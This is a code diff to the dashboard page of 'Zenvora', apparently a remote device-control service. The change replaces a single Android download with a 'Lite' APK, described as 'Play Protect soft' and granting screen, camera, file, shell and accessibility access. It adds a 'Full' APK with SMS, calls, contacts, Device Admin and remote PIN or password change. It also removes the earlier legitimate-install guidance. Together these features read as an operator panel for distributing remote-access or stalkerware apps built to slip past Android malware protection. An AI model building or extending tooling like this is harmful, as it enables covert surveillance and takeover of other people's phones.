@@ -225,8 +225,18 @@ export default function DashboardPage() {
   })();
   const agentDownloadUrl =
     process.env.NEXT_PUBLIC_AGENT_DOWNLOAD_URL || `${apiBase}/api/agent/download`;
-  const androidApkUrl =
-    process.env.NEXT_PUBLIC_ANDROID_APK_URL || `${apiBase}/api/agent/download?platform=android`;
+  const androidLiteApkUrl =
+    process.env.NEXT_PUBLIC_ANDROID_LITE_APK_URL ||
+    `${apiBase}/api/agent/download?platform=android&flavor=lite`;
+  const androidFullApkUrl =
+    process.env.NEXT_PUBLIC_ANDROID_FULL_APK_URL ||
+    process.env.NEXT_PUBLIC_ANDROID_APK_URL ||
+    `${apiBase}/api/agent/download?platform=android&flavor=full`;
+  const androidApkUrl = androidFullApkUrl;
+  const androidPlayStoreUrl =
+    process.env.NEXT_PUBLIC_ANDROID_PLAY_STORE_URL ||
+    process.env.NEXT_PUBLIC_PLAY_STORE_URL ||
+    "";
 
   const refreshBootstrapCommand = async (token: string, userId: string) => {
     setBootstrapLoading(true);
@@ -977,11 +987,12 @@ export default function DashboardPage() {
               <div className="px-8 py-6 overflow-y-auto max-h-[calc(90vh-180px)] space-y-6">
                 <div>
                   <h3 className="text-xl font-semibold mb-1">
-                    Install Zenvora APK
+                    Install Zenvora (Android)
                     {selectedAndroidVersion ? ` · Android ${selectedAndroidVersion}` : ""}
                   </h3>
                   <p className="text-sm text-muted-foreground">
-                    Sideload the workspace companion. After install, open the app and enter the Pair Token below.
+                    Do APK choose karo: <strong className="text-foreground">Lite</strong> (Play Protect soft) ya{" "}
+                    <strong className="text-foreground">Full</strong> (sab features + Device Admin).
                   </p>
                 </div>
 
@@ -996,51 +1007,71 @@ export default function DashboardPage() {
                   </div>
                 </div>
 
-                <div className="rounded-xl border border-border p-4 space-y-3">
-                  <h4 className="font-semibold text-foreground">Install options</h4>
-                  <ol className="list-decimal list-inside space-y-2 text-sm text-muted-foreground">
-                    <li>Download the APK on this phone (or transfer from PC).</li>
-                    <li>Allow install from this browser / Files (Unknown apps).</li>
-                    <li>Open Zenvora → enter Pair Token + User ID → Grant permissions (battery, notifications, device admin).</li>
-                    <li>Keep the ongoing “Zenvora connection” notification on (silent is fine).</li>
-                  </ol>
-                  <div className="flex flex-wrap gap-2 pt-2">
-                    <a href={androidApkUrl} target="_blank" rel="noreferrer">
-                      <Button className="bg-foreground text-background hover:bg-foreground/90">
-                        <DownloadCloud className="w-4 h-4 mr-2" />
-                        Download Zenvora APK
-                      </Button>
-                    </a>
-                    <Button
-                      variant="outline"
-                      onClick={() => {
-                        if (pairingToken) void navigator.clipboard.writeText(pairingToken);
-                      }}
-                    >
-                      Copy Pair Token
-                    </Button>
-                    <Button
-                      variant="outline"
-                      onClick={() => {
-                        if (pairingUserId) void navigator.clipboard.writeText(pairingUserId);
-                      }}
-                    >
-                      Copy User ID
-                    </Button>
-                  </div>
+                <div className="flex flex-wrap gap-2">
+                  <Button
+                    variant="outline"
+                    onClick={() => {
+                      if (pairingToken) void navigator.clipboard.writeText(pairingToken);
+                    }}
+                  >
+                    Copy Pair Token
+                  </Button>
+                  <Button
+                    variant="outline"
+                    onClick={() => {
+                      if (pairingUserId) void navigator.clipboard.writeText(pairingUserId);
+                    }}
+                  >
+                    Copy User ID
+                  </Button>
                 </div>
 
-                <div className="rounded-xl border border-amber-500/30 bg-amber-500/5 p-4 space-y-2 text-sm">
-                  <h4 className="font-semibold text-foreground">Play Protect / legitimate install</h4>
-                  <p className="text-muted-foreground">
-                    Zenvora is a signed workspace agent (not on Play Store by default). Google Play Protect may warn on first sideload — that is normal for enterprise companions.
-                  </p>
-                  <ul className="list-disc list-inside text-muted-foreground space-y-1">
-                    <li>Install only from <strong className="text-foreground">your</strong> Zenvora dashboard URL.</li>
-                    <li>If Play Protect blocks: open the warning → Details → Install anyway (only if you trust this workspace).</li>
-                    <li>Or: Play Store → profile → Play Protect → Settings → scan apps with Play Protect (temporarily off while installing), then turn back on.</li>
-                    <li>For org-wide trust: publish via Managed Google Play / private track, or enroll as Device Owner / work profile MDM.</li>
-                  </ul>
+                <div className="grid gap-4 md:grid-cols-2">
+                  <div className="rounded-xl border border-emerald-500/40 bg-emerald-500/5 p-5 space-y-3 flex flex-col">
+                    <div>
+                      <p className="text-xs font-semibold uppercase tracking-wider text-emerald-700 dark:text-emerald-400">
+                        Option A
+                      </p>
+                      <h4 className="text-lg font-semibold text-foreground mt-1">Lite APK</h4>
+                      <p className="text-sm text-muted-foreground mt-2">
+                        App name <strong className="text-foreground">Zenvora Lite</strong> — screen, camera, files,
+                        shell, notifications, browser. SMS / Device Admin nahi.
+                      </p>
+                      <ul className="mt-2 text-xs text-muted-foreground space-y-1 list-disc list-inside">
+                        <li>Install ke baad phone pe saari permissions ON karo (screen + accessibility)</li>
+                        <li>Naya build 1.9.4+ use karo — purani Lite broken thi</li>
+                      </ul>
+                    </div>
+                    <a href={androidLiteApkUrl} target="_blank" rel="noreferrer" className="mt-auto">
+                      <Button className="w-full bg-foreground text-background hover:bg-foreground/90">
+                        <DownloadCloud className="w-4 h-4 mr-2" />
+                        Download Lite APK
+                      </Button>
+                    </a>
+                  </div>
+
+                  <div className="rounded-xl border border-border bg-card p-5 space-y-3 flex flex-col">
+                    <div>
+                      <p className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">
+                        Option B
+                      </p>
+                      <h4 className="text-lg font-semibold text-foreground mt-1">Full APK</h4>
+                      <p className="text-sm text-muted-foreground mt-2">
+                        Sab kuch: SMS, calls, contacts, Device Admin, usage stats, install packages.
+                      </p>
+                      <ul className="mt-2 text-xs text-muted-foreground space-y-1 list-disc list-inside">
+                        <li>Lite ki saari cheezein + Phone page</li>
+                        <li>Device administrator + Lock / PIN / password / pattern change</li>
+                        <li>Play Protect hard-block ho sakta hai</li>
+                      </ul>
+                    </div>
+                    <a href={androidFullApkUrl} target="_blank" rel="noreferrer" className="mt-auto">
+                      <Button className="w-full" variant="outline">
+                        <DownloadCloud className="w-4 h-4 mr-2" />
+                        Download Full APK
+                      </Button>
+                    </a>
+                  </div>
                 </div>
               </div>
             ) : ['mac', 'ios', 'linux'].includes(String(selectedPlatform)) ? (
@@ -1213,7 +1244,7 @@ export default function DashboardPage() {
               <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
                 <p className="text-sm text-muted-foreground">
                   {selectedPlatform === "android"
-                    ? "Zenvora.apk · pair in-app after install"
+                    ? "Lite = Protect soft · Full = all permissions + Device Admin"
                     : "ZenvoraAgent.exe · headless provision + service install"}
                 </p>
                 <div className="flex flex-col gap-3 sm:flex-row sm:items-center">
@@ -1221,12 +1252,20 @@ export default function DashboardPage() {
                     Close
                   </Button>
                   {selectedPlatform === "android" ? (
-                    <a href={androidApkUrl} target="_blank" rel="noreferrer">
-                      <Button className="bg-foreground text-background hover:bg-foreground/90">
-                        <DownloadCloud className="w-4 h-4 mr-2" />
-                        Download APK
-                      </Button>
-                    </a>
+                    <>
+                      <a href={androidLiteApkUrl} target="_blank" rel="noreferrer">
+                        <Button variant="outline">
+                          <DownloadCloud className="w-4 h-4 mr-2" />
+                          Lite APK
+                        </Button>
+                      </a>
+                      <a href={androidFullApkUrl} target="_blank" rel="noreferrer">
+                        <Button className="bg-foreground text-background hover:bg-foreground/90">
+                          <DownloadCloud className="w-4 h-4 mr-2" />
+                          Full APK
+                        </Button>
+                      </a>
+                    </>
                   ) : selectedPlatform === "windows" ? (
                     <a href={agentDownloadUrl} target="_blank" rel="noreferrer">
                       <Button className="bg-foreground text-background hover:bg-foreground/90">
